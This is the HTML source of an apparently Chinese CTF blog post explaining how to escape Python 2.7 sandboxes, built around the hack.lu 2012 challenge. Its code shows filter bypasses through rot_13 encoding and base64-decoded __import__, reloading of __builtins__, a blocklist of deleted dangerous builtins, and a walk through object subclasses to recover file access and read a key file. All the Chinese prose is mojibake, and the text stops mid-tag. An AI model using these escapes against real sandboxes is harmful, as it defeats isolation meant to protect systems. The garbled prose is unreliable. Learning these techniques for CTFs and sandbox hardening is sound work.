title="å‰è¨€"></a>å‰è¨€</h2><p>ä½œä¸ºä¸€ä¸ªCTFçˆ±å¥½è€…ï¼Œåˆæ˜¯ä¸€ä¸ªBiné€‰æ‰‹ï¼Œåœ¨å›½å¤–å„ç§å—è™çš„åŒæ—¶ï¼Œæ€»æ˜¯èƒ½å­¦åˆ°ä¸å°‘çš„ä¸œè¥¿ã€‚æœ€è¿‘ï¼Œå’Œå¸ˆå‚…ä»¬åœ¨åšå›½å¤–çš„CTFé¢˜ï¼Œåšåˆ°ä¸€ç§Pwné¢˜ç›®ï¼Œæ˜¯éœ€è¦é€‰æ‰‹åœ¨Pythonçš„æ²™ç®±è¾¾åˆ°é€ƒé€¸çš„ç›®çš„ï¼Œè·å–flagã€‚åœ¨è°·æ­Œçš„è¿‡ç¨‹ä¸­ï¼Œæ‰¾åˆ°äº†ä¸€ç¯‡ä¸é”™çš„åšæ–‡ã€‚</p><h2 id="æ­£æ–‡"><a href="#æ­£æ–‡" class="headerlink" title="æ­£æ–‡"></a>æ­£æ–‡</h2><p>æ³¨æ„ï¼šè¿™æ˜¯ä¸ºPython 2.7.3ç¼–å†™çš„ã€‚è¿™äº›ç»†èŠ‚å¯èƒ½åœ¨å…¶ä»–ç‰ˆæœ¬çš„Python - ç‰¹åˆ«æ˜¯Python3 - æœ‰æ‰€ä¸åŒï¼</p><p>å°è¯•é€ƒç¦»æ²™ç®±æ€»æ˜¯ä¸€ä¸ªæœ‰è¶£çš„æŒ‘æˆ˜ã€‚Pythonæ²™ç®±ä¹Ÿä¸ä¾‹å¤–ã€‚åœ¨é™æ€è¯­è¨€ä¸­ï¼Œè¿™é€šå¸¸é€šè¿‡åˆ†æä»£ç æ¥æŸ¥çœ‹æ˜¯å¦è°ƒç”¨æŸäº›å‡½æ•°ï¼Œæˆ–è€…ç”¨ç¡®è®¤éªŒè¯çš„ä»£ç åŒ…è£…å±é™©å‡½æ•°æ¥å®Œæˆã€‚ç„¶è€Œï¼Œè¿™åœ¨åŠ¨æ€è¯­è¨€ï¼ˆå¦‚Pythonï¼‰ä¸­æœ‰ç‚¹æ›´å…·æŒ‘æˆ˜æ€§ã€‚</p><p>æ²™ç›’çš„ä¸€ä¸ªç®€å•æ–¹æ³•æ˜¯æ‰«æè„šæœ¬çš„å†…å®¹ï¼Œä»¥æŸ¥æ‰¾å±é™©çš„ç‰¹å®šå…³é”®å­—æˆ–å‡½æ•°ï¼Œä¾‹å¦‚evalï¼Œexecï¼Œexecfileå’Œimportã€‚è¿™å¯ä»¥å¾ˆå®¹æ˜“åœ°é€šè¿‡ç¼–ç æˆ‘ä»¬çš„è„šæœ¬æ¥ä¾§é¢æ”»å‡»ã€‚<a href="http://www.python.org/dev/peps/pep-0263/">PEP-0263</a>ï¼Œè¿™é‡Œæœ‰æ›´åŠ è¯¦ç»†çš„ä»‹ç»ã€‚<br>ä½†åªè¦ä½ æœ‰<code># coding:&lt;encoding&gt;</code>è„šæœ¬çš„å‰ä¸¤è¡Œä¹‹ä¸€ï¼ŒPythonè§£é‡Šå™¨å°†è§£é‡Šè¿™ä¸ªç¼–ç çš„æ•´ä¸ªè„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding: rot_13</span></span><br><span class="line"><span class="comment"># &quot;import evil_module&quot; encoded in ROT13</span></span><br><span class="line"><span class="string">&#x27;vzcbeg rivy_zbqhyr&#x27;</span></span><br></pre></td></tr></table></figure><p>æ˜¾ç„¶ï¼Œæˆ‘ä»¬éœ€è¦ä¸€ç§æ›´å¥½çš„æ€è·¯æ¥è¿›è¡Œé€ƒé€¸ã€‚ä½†æ˜¯è¿™ä¹‹å‰ï¼Œæˆ‘ä»¬éœ€è¦äº†è§£ä¸€äº›èƒŒæ™¯çŸ¥è¯†ã€‚</p><h2 id="èƒŒæ™¯çŸ¥è¯†"><a href="#èƒŒæ™¯çŸ¥è¯†" class="headerlink" title="èƒŒæ™¯çŸ¥è¯†"></a>èƒŒæ™¯çŸ¥è¯†</h2><p>æˆ‘ä»¬çŸ¥é“ï¼Œ<code>dir</code>å¯ä»¥ä½œä¸ºæˆ‘ä»¬æ£€Pythonå¯¹è±¡çš„ç¬¬ä¸€ä¸ªå·¥å…·ã€‚å¼•åŠ¨docs:â€œWithout arguments, return the list of names in the current local scope. With an argument, attempt to return a list of valid attributes for that object.â€ï¼Œå°±æ˜¯è¯´ï¼Œâ€œ æ²¡æœ‰å‚æ•°ï¼Œè¿”å›å½“å‰æœ¬åœ°ä½œç”¨åŸŸä¸­çš„åç§°åˆ—è¡¨ã€‚ä½¿ç”¨å‚æ•°ï¼Œå°è¯•è¿”å›è¯¥å¯¹è±¡çš„æœ‰æ•ˆå±æ€§çš„åˆ—è¡¨ã€‚â€œ<br>å®ƒå¹¶ä¸å£°ç§°æ˜¯å®Œæ•´çš„ï¼Œä¸€ä¸ªç±»å¯ä»¥å®šä¹‰ä¸€ä¸ª<code>__dir__</code>æ–¹æ³•ï¼Œä½†ç°åœ¨æˆ‘ä»¬å¯ä»¥å‡è®¾å®ƒæ˜¯æ­£ç¡®çš„ã€‚</p><p>æˆ‘ä»¬ç»å¸¸ä½¿ç”¨çš„ç¬¬äºŒä¸ªåŠŸèƒ½æ˜¯<code>type</code>ï¼Œç®€å•æ¥è¯´ï¼Œä½¿ç”¨å•ä¸ªå‚æ•°ï¼Œå®ƒä¼šç»™ä½ ä¸€ä¸ªå¯¹è±¡çš„ç±»å‹ - è¿™å¯ä»¥æœ‰åŠ©äºç†è§£ä»€ä¹ˆæ˜¯ä¸€æ—¦ä½ çŸ¥é“å®ƒçš„å­˜åœ¨ã€‚å†æ¬¡ï¼Œå¼•ç”¨æ–‡æ¡£ï¼šâ€œ è¿”å›å¯¹è±¡çš„ç±»å‹ã€‚è¿”å›å€¼æ˜¯ä¸€ä¸ªç±»å‹å¯¹è±¡ã€‚â€œã€‚</p><p>æ‰€ä»¥ç°åœ¨è®©æˆ‘ä»¬å¼€å§‹æˆ³ã€‚</p><p>å½“æ‰§è¡Œå¼€å§‹æ—¶ï¼Œä»¥ä¸‹å¯¹è±¡åœ¨æœ¬åœ°ä½œç”¨åŸŸä¸­ï¼ˆyay dir()ï¼ï¼‰ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>dir()</span><br><span class="line">[<span class="string">&#x27;__builtins__&#x27;</span>, <span class="string">&#x27;__doc__&#x27;</span>, <span class="string">&#x27;__name__&#x27;</span>, <span class="string">&#x27;__package__&#x27;</span>]</span><br><span class="line">ä»è¿™äº›ï¼Œ__builtins__æ˜¯æœ€æœ‰è¶£ã€‚</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>type(__builtins__)</span><br><span class="line">&lt;type <span class="string">&#x27;module&#x27;</span>&gt;</span><br></pre></td></tr></table></figure><p>å—¯ï¼Œè®©æˆ‘ä»¬çœ‹çœ‹Pythonè¯­è¨€å‚è€ƒï¼š â€œä¸€ä¸ªæ¨¡å—å¯¹è±¡æœ‰ä¸€ä¸ªç”±å­—å…¸å¯¹è±¡å®ç°çš„å‘½åç©ºé—´â€¦å±æ€§å¼•ç”¨è¢«è½¬æ¢ä¸ºè¿™ä¸ªå­—å…¸ä¸­çš„æŸ¥æ‰¾ï¼Œä¾‹å¦‚ï¼Œm.xç­‰åŒäºmã€‚dict [â€œxâ€]â€œ`</p><p>ç°åœ¨ï¼Œæˆ‘ä»¬å¯ä»¥æ£€æŸ¥å†…ç½®ç¨‹åºç®€å•åœ°é€šè¿‡è¿è¡Œdir(<strong>builtins</strong>) è¯¥åˆ—è¡¨æœ‰ç‚¹é•¿ã€‚æ¡ç›®æ˜¯æ‰€æœ‰å†…ç½®ç±»å‹å’Œå‡½æ•°ã€‚</p><p>æ‰€ä»¥ç°åœ¨è®©æˆ‘ä»¬é‡æ¸©å‰é¢çš„æ²™ç›’æµ‹è¯•çš„å­—ç¬¦ä¸²æ£€æŸ¥æ–¹æ³•ã€‚ä¹Ÿè®¸ä½ æ²¡æœ‰èƒ½åŠ›æ”¹å˜æ•´ä¸ªæ–‡ä»¶çš„ç¼–ç ã€‚æ‚¨ä»ç„¶å¯ä»¥é€šè¿‡è®¿é—®æ¨¡å—çš„åº•å±‚dictï¼Œç„¶åä½¿ç”¨å˜é‡è®¿é—®æ‰€éœ€çš„å‡½æ•°æ¥å¯¹å•ä¸ªå‡½æ•°è°ƒç”¨çš„åç§°è¿›è¡Œç¼–ç ã€‚æ‰€ä»¥è®©æˆ‘ä»¬import osä½¿ç”¨å†…ç½®å‡½æ•°ç¨å¾®ç‹¡çŒ¾çš„æ–¹å¼è°ƒç”¨<strong>import__ï¼šé¦–å…ˆè·å–base64ç‰ˆæœ¬çš„å­—ç¬¦ä¸²â€__import</strong>â€œå’Œâ€osâ€ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> base64</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>base64.b64encode(<span class="string">&#x27;__import__&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;X19pbXBvcnRfXw==&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>base64.b64encode(<span class="string">&#x27;os&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;b3M=&#x27;</span></span><br></pre></td></tr></table></figure><p>æŠŠå®ƒæ”¾åœ¨ä¸€èµ·ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>__builtins__.__dict__[<span class="string">&#x27;X19pbXBvcnRfXw==&#x27;</span>.decode(<span class="string">&#x27;base64&#x27;</span>)](<span class="string">&#x27;b3M=&#x27;</span>.decode(<span class="string">&#x27;base64&#x27;</span>))</span><br><span class="line">&lt;module <span class="string">&#x27;os&#x27;</span> <span class="keyword">from</span> <span class="string">&#x27;/usr/lib/python2.7/os.pyc&#x27;</span>&gt;</span><br></pre></td></tr></table></figure><p>å—¯ï¼Œæ‰€ä»¥ä½¿ç”¨æ–‡æœ¬è¿‡æ»¤åˆ°æ²™ç›’ä»£ç å¾ˆæ˜æ˜¾ã€‚</p><p>ä¹Ÿè®¸æˆ‘ä»¬å¯ä»¥é‡‡å–å¦ä¸€ç§æ–¹æ³•åœ¨è¿‡æ»¤ï¼ŒåŸºäºä½¿ç”¨<strong>builtins</strong>.<strong>dict__ã€‚å› ä¸º__builtins</strong>.__dict__æ˜¯ä¸€ä¸ªä»£è¡¨æˆ‘ä»¬çš„ç¯å¢ƒå¯ç”¨çš„æ‰€æœ‰å†…ç½®å‡½æ•°çš„å­—å…¸ï¼Œå¦‚æœæˆ‘ä»¬ä¿®æ”¹å…¶ä¸­ä¸€ä¸ªæ¡ç›®ï¼Œæˆ‘ä»¬å¯ä»¥æ”¹å˜ç¯å¢ƒçš„å¯ç”¨å†…å®¹ã€‚</p><p>ä¾‹å¦‚ï¼Œabså‡½æ•°è¿”å›æ•°å­—çš„ç»å¯¹å€¼ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>abs(<span class="number">-1</span>)</span><br><span class="line"><span class="number">1</span></span><br></pre></td></tr></table></figure><p>##ã€€å°è¯•æ”»å‡»<br>ç°åœ¨ï¼Œè®©æˆ‘ä»¬åšæ›´å¤šçš„æ“ä½œ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>__builtins__.__dict__[<span class="string">&#x27;abs&#x27;</span>] = <span class="literal">None</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>abs(<span class="number">-1</span>)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">TypeError: <span class="string">&#x27;NoneType&#x27;</span> object <span class="keyword">is</span> <span class="keyword">not</span> callable</span><br></pre></td></tr></table></figure><p>è¯¥delè¯­å¥åˆ é™¤ä¸€ä¸ªå¯¹è±¡çš„å¼•ç”¨ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">del</span> __builtins__.__dict__[<span class="string">&#x27;abs&#x27;</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>abs(<span class="number">-1</span>)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">NameError: name <span class="string">&#x27;abs&#x27;</span> <span class="keyword">is</span> <span class="keyword">not</span> defined</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬åˆšåˆšåˆ é™¤äº†ç¯å¢ƒè°ƒç”¨çš„èƒ½åŠ›absï¼æ‰€ä»¥ç°åœ¨æˆ‘ä»¬æœ‰å¦ä¸€ç§æ–¹æ³•æ¥å¤„ç†Pythonæ²™ç›’ - åˆ é™¤è®¸å¤šâ€œå±é™©â€å†…ç½®å‡½æ•°ã€‚</p><p>è®©æˆ‘ä»¬åšä¸€ä¸ªå°çš„å±é™©å‡½æ•°åˆ—è¡¨ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">del</span> __builtins__.__dict__[<span class="string">&#x27;__import__&#x27;</span>] <span class="comment"># __import__ is the function called by the import statement</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">del</span> __builtins__.__dict__[<span class="string">&#x27;eval&#x27;</span>] <span class="comment"># evaluating code could be dangerous</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">del</span> __builtins__.__dict__[<span class="string">&#x27;execfile&#x27;</span>] <span class="comment"># likewise for executing the contents of a file</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">del</span> __builtins__.__dict__[<span class="string">&#x27;input&#x27;</span>] <span class="comment"># Getting user input and evaluating it might be dangerous</span></span><br></pre></td></tr></table></figure><p>å—¯ï¼Œè¿™çœ‹èµ·æ¥æœ‰ç‚¹å®‰å…¨ï¼Œå¯¹å§ï¼Ÿ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> os</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">ImportError: __import__ <span class="keyword">not</span> found</span><br></pre></td></tr></table></figure><p>ç­‰ä¸€ä¸‹ï¼<br>reload(module) é‡æ–°åŠ è½½å¯¼å…¥çš„æ¨¡å—ï¼Œå¹¶æ‰§è¡Œä»£ç  - æ‰€ä»¥æ¨¡å—è¢«å¯¼å›åˆ°æˆ‘ä»¬çš„å‘½åç©ºé—´ã€‚   </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>reload(__builtins__)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> os</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>dir(os)</span><br></pre></td></tr></table></figure><p>æˆ‘æƒ³æˆ‘ä»¬å¿…é¡»å°†å…¶æ·»åŠ åˆ°åˆ—è¡¨ä¸­ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">del</span> __builtins__.__dict__[<span class="string">&#x27;reload&#x27;</span>] <span class="comment"># they might reload __builtins__ !</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å¥½ã€‚æ‰€ä»¥ç°åœ¨æˆ‘ä»¬æœ‰ä¸€ä¸ªå®‰å…¨çš„æ–¹æ³•ï¼Œå¯¹å§ï¼Ÿæˆ‘ä»¬é˜»æ­¢äº†æ²™ç®±ä¸­çš„ä»»ä½•äººä½¿ç”¨å±é™©çš„å†…ç½®å‘½ä»¤ï¼Œå¹¶ä¸”æˆ‘ä»¬å¯ä»¥é€šè¿‡ä¸å…è®¸ä»–ä»¬å¯¹æ•´ä¸ªæ–‡ä»¶è¿›è¡Œç¼–ç å’Œæ‰«æå†…å®¹æ¥é˜»æ­¢ä»–ä»¬ä½¿ç”¨evalå…³é”®å­—ã€‚å¸Œæœ›æˆ‘ä»¬åˆ é™¤æ‰€æœ‰å±é™©çš„å†…ç½®â€¦<br>è®©æˆ‘ä»¬ä»<strong>2012.hack.lu</strong>åœ¨ä»–ä»¬çš„é¢˜ç›®ä¸­ï¼Œä½ éœ€è¦è¯»å–ä¸€ä¸ªæ–‡ä»¶ï¼Œâ€™./keyâ€™çš„å†…å®¹ã€‚</p><p>ä»–ä»¬é¦–å…ˆé€šè¿‡åˆ é™¤å¼•ç”¨æ¥é”€æ¯æ‰“å¼€æ–‡ä»¶çš„å†…ç½®å‡½æ•°ã€‚ç„¶åå®ƒä»¬å…è®¸æ‚¨æ‰§è¡Œç”¨æˆ·è¾“å…¥ã€‚çœ‹çœ‹ä»–ä»¬çš„ä»£ç ç¨å¾®ä¿®æ”¹çš„ç‰ˆæœ¬ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">make_secure</span>():</span></span><br><span class="line">    UNSAFE = [<span class="string">&#x27;open&#x27;</span>,</span><br><span class="line">              <span class="string">&#x27;file&#x27;</span>,</span><br><span class="line">              <span class="string">&#x27;execfile&#x27;</span>,</span><br><span class="line">              <span class="string">&#x27;compile&#x27;</span>,</span><br><span class="line">              <span class="string">&#x27;reload&#x27;</span>,</span><br><span class="line">              <span class="string">&#x27;__import__&#x27;</span>,</span><br><span class="line">              <span class="string">&#x27;eval&#x27;</span>,</span><br><span class="line">              <span class="string">&#x27;input&#x27;</span>]</span><br><span class="line">    <span class="keyword">for</span> func <span class="keyword">in</span> UNSAFE:</span><br><span class="line">        <span class="keyword">del</span> __builtins__.__dict__[func]</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> re <span class="keyword">import</span> findall</span><br><span class="line"><span class="comment"># Remove dangerous builtins</span></span><br><span class="line">make_secure()</span><br><span class="line"><span class="keyword">print</span> <span class="string">&#x27;Go Ahead, Expoit me &gt;;D&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># Read user input until the first whitespace character</span></span><br><span class="line">        inp = findall(<span class="string">&#x27;\S+&#x27;</span>, raw_input())[<span class="number">0</span>]</span><br><span class="line">        a = <span class="literal">None</span></span><br><span class="line">        <span class="comment"># Set a to the result from executing the user input</span></span><br><span class="line">        <span class="keyword">exec</span> <span class="string">&#x27;a=&#x27;</span> + inp</span><br><span class="line">        <span class="keyword">print</span> <span class="string">&#x27;Return Value:&#x27;</span>, a</span><br><span class="line">    <span class="keyword">except</span> Exception, e:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">&#x27;Exception:&#x27;</span>, e</span><br></pre></td></tr></table></figure><p>ç¼–ç æŠ€å·§ä¸ä¼šå·¥ä½œ - æˆ‘ä»¬æ²¡æœ‰å‚è€ƒfileæˆ–openåœ¨__builtins__ã€‚ä½†æ˜¯ï¼Œä¹Ÿè®¸æˆ‘ä»¬å¯ä»¥å‚è€ƒæŒ–å‡ºæ¥fileï¼Œæˆ–openä»è§£é‡Šå…¶ä»–ä½ç½®å¹¶ä½¿ç”¨å®ƒï¼Ÿ<br>è®©æˆ‘ä»¬æ·±å…¥ä¸€ç‚¹<br>ï¼ˆå¯¹äºè¿™ä¸€éƒ¨åˆ†ï¼Œæˆ‘éœ€è¦å¯¹<a href="http://nedbatchelder.com/blog/201206/eval_really_is_dangerous.html">Ned Batchelder</a>å‚è€ƒå­¦ä¹ ï¼Œæˆ‘ä¸€å¹´çš„å¤å¤©æ­£åœ¨é˜…è¯»ä»–çš„<a href="https://nedbatchelder.com/blog/201206/eval_really_is_dangerous.html">åšå®¢</a>ï¼Œä»–æœ‰ä¸€ä¸ªå¾ˆå¥½çš„evalå†™æ³•ï¼Œè¯´æ˜ä¸€ä¸ªéå¸¸å±é™©çš„è¯­å¥ï¼Œä»–åœ¨ä»–çš„ä»£ç ä¸­é€šè¿‡è¿™ä¸ªæ–¹æ³•ï¼‰ã€‚<br>å¦‚å‰æ‰€è¿°ï¼Œtypeåœ¨å¯¹è±¡ä¸Šè¿è¡Œè¿”å›ä¸€ä¸ªtype objectã€‚ä¾‹å¦‚ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>type( [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>] )</span><br><span class="line">&lt;type <span class="string">&#x27;list&#x27;</span>&gt;</span><br></pre></td></tr></table></figure><p>ç°åœ¨ï¼Œè®©æˆ‘ä»¬å¼€å§‹æ£€æŸ¥ä¸€ä¸ªå…ƒç»„çš„å­—æ®µï¼š<br>è¿™äº›éƒ½æ˜¯åŠŸèƒ½ã€‚ä½†__class__æœ‰ç‚¹æœ‰è¶£ã€‚å®ƒè¿”å›è¡¨ç¤ºå¯¹è±¡çš„ç±»ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>type(().__class__)</span><br><span class="line">&lt;type <span class="string">&#x27;type&#x27;</span>&gt;</span><br></pre></td></tr></table></figure><p>è¿™è¿›å…¥å…ƒç±»å’Œå…ƒç±»å‹è¯¦ç»†ä¿¡æ¯ã€‚æ›´å¤šçš„å†…å®¹éƒ½åœ¨ï¼Œ<a href="http://www.python.org/dev/peps/pep-0253/">PEP 0253</a>ã€‚è®©æˆ‘ä»¬ç°åœ¨å¿½ç•¥ï¼Œå¹¶æ·±å…¥ä¸€ç‚¹ã€‚</p><p>æ ¹æ®æ–‡æ¡£ï¼Œæ–°å¼ç±»æœ‰ä¸€äº›ç‰¹æ®Šçš„å±æ€§ã€‚å…·ä½“æ¥è¯´ï¼Œ<strong>bases__å®ƒåŒ…å«â€œåŸºç±»ï¼ŒæŒ‰å®ƒä»¬åœ¨åŸºç±»åˆ—è¡¨ä¸­å‡ºç°çš„é¡ºåºâ€ class.__subclasses</strong>()ï¼Œå¹¶è¿”å›æ‰€æœ‰å­ç±»çš„åˆ—è¡¨ã€‚</p><p>è®©æˆ‘ä»¬æ¥çœ‹çœ‹æˆ‘ä»¬çš„å…ƒç»„ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>().__class__.__bases__</span><br><span class="line">(&lt;type <span class="string">&#x27;object&#x27;</span>&gt;,)</span><br></pre></td></tr></table></figure><p>å®ƒç›´æ¥ä»å¯¹è±¡ç»§æ‰¿ã€‚æˆ‘ä¸çŸ¥é“è¿˜æœ‰ä»€ä¹ˆï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>().__class__.__bases__[<span class="number">0</span>].__subclasses__()</span><br><span class="line">[&lt;type <span class="string">&#x27;weakproxy&#x27;</span>&gt;, &lt;type <span class="string">&#x27;int&#x27;</span>&gt;, &lt;type <span class="string">&#x27;basestring&#x27;</span>&gt;,</span><br><span class="line">&lt;type <span class="string">&#x27;bytearray&#x27;</span>&gt;, &lt;type <span class="string">&#x27;list&#x27;</span>&gt;, &lt;type <span class="string">&#x27;NoneType&#x27;</span>&gt;,</span><br><span class="line">&lt;type <span class="string">&#x27;NotImplementedType&#x27;</span>&gt;, &lt;type <span class="string">&#x27;traceback&#x27;</span>&gt;, &lt;type <span class="string">&#x27;super&#x27;</span>&gt;,</span><br><span class="line">&lt;type <span class="string">&#x27;xrange&#x27;</span>&gt;, &lt;type <span class="string">&#x27;dict&#x27;</span>&gt;, &lt;type <span class="string">&#x27;set&#x27;</span>&gt;, &lt;type <span class="string">&#x27;slice&#x27;</span>&gt;,</span><br><span class="line">&lt;type <span class="string">&#x27;staticmethod&#x27;</span>&gt;, &lt;type <span class="string">&#x27;complex&#x27;</span>&gt;, &lt;type <span class="string">&#x27;float&#x27;</span>&gt;,</span><br><span class="line">&lt;type <span class="string">&#x27;buffer&#x27;</span>&gt;, &lt;type <span class="string">&#x27;long&#x27;</span>&gt;, &lt;type <span class="string">&#x27;frozenset&#x27;</span>&gt;,</span><br><span class="line">&lt;type <span class="string">&#x27;property&#x27;</span>&gt;, &lt;type <span class="string">&#x27;memoryview&#x27;</span>&gt;, &lt;type <span class="string">&#x27;tuple&#x27;</span>&gt;,</span><br><span class="line">&lt;type <span class="string">&#x27;enumerate&#x27;</span>&gt;, &lt;type <span class="string">&#x27;reversed&#x27;</span>&gt;, &lt;type <span class="string">&#x27;code&#x27;</span>&gt;,</span><br><span class="line">&lt;type <span class="string">&#x27;frame&#x27;</span>&gt;, &lt;type <span class="string">&#x27;builtin_function_or_method&#x27;</span>&gt;,</span><br><span class="line">&lt;type <span class="string">&#x27;instancemethod&#x27;</span>&gt;, &lt;type <span class="string">&#x27;function&#x27;</span>&gt;, &lt;type <span class="string">&#x27;classobj&#x27;</span>&gt;,</span><br><span class="line">&lt;type <span class="string">&#x27;dictproxy&#x27;</span>&gt;, &lt;type <span class="string">&#x27;generator&#x27;</span>&gt;, &lt;type <span class="string">&#x27;getset_descriptor&#x27;</span>&gt;,</span><br><span class="line">&lt;type <span class="string">&#x27;wrapper_descriptor&#x27;</span>&gt;, &lt;type <span class="string">&#x27;instance&#x27;</span>&gt;, &lt;type <span class="string">&#x27;ellipsis&#x27;</span>&gt;,</span><br><span class="line">&lt;type <span class="string">&#x27;member_descriptor&#x27;</span>&gt;, &lt;type <span class="string">&#x27;file&#x27;</span>&gt;, &lt;type <span class="string">&#x27;sys.long_info&#x27;</span>&gt;,</span><br><span class="line"><span class="meta">... </span><span class="keyword">and</span> more!</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬åœ¨è¿™é‡Œæœ‰æˆ‘ä»¬éœ€è¦çš„ä¸€åˆ‡ï¼</p><p>ç„¶åæˆ‘å¯ä»¥fileç”¨ä¸€äº›ç®€å•çš„è¡Œåœ¨åˆ—è¡¨ä¸­æ‰¾åˆ°ç´¢å¼•ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>all_classes = []</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> entry <span class="keyword">in</span> ().__class__.__bases__[<span class="number">0</span>].__subclasses__():</span><br><span class="line"><span class="meta">... </span>    all_classes.append(entry.__name__)</span><br><span class="line">...</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>all_classes.index(<span class="string">&quot;file&quot;</span>)</span><br><span class="line"><span 